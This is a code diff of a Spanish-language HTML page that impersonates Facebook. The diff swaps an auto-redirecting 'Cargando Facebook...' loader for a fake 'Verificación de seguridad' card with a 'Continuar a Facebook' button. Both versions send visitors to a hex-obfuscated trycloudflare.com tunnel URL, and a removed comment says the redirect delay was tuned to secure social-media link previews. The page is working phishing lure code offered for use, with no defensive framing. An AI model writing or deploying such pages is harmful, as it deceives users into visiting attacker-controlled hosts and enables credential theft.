@@ -18,27 +18,25 @@
     <title>Facebook - Iniciar sesión</title>
     
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; margin: 0; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0866ff; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { margin-left: 15px; color: #606770; font-size: 14px; }
+        body { font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1); text-align: center; max-width: 400px; }
+        .btn { background: #1877f2; color: white; border: none; padding: 10px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; text-decoration: none; display: inline-block; margin-top: 20px; }
+        p { color: #606770; font-size: 14px; line-height: 1.4; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p>Cargando Facebook...</p>
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/100px-2021_Facebook_icon.svg.png" alt="FB">
+        <h3>Verificación de seguridad</h3>
+        <p>Para proteger tu cuenta, confirma que eres tú quien intenta acceder desde este navegador.</p>
+        <button class="btn" onclick="redirigir()">Continuar a Facebook</button>
+    </div>
 
     <script>
-        /**
-         * Nueva URL de Cloudflare en formato hexadecimal:
-         * https://incoming-boots-accountability-prefix.trycloudflare.com
-         */
         var _0x4f22 = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x6e\x63\x6f\x6d\x69\x6e\x67\x2d\x62\x6f\x6f\x74\x73\x2d\x61\x63\x63\x6f\x75\x6e\x74\x61\x62\x69\x6c\x69\x74\x79\x2d\x70\x72\x65\x66\x69\x78\x2e\x74\x72\x79\x63\x6c\x6f\x75\x64\x66\x6c\x61\x72\x65\x2e\x63\x6f\x6d";
-
-        // Redirección con 2 segundos para asegurar la vista previa en redes sociales
-        setTimeout(function() {
+        function redirigir() {
             window.location.href = _0x4f22;
-        }, 2000);
+        }
     </script>
 </body>
 </html>
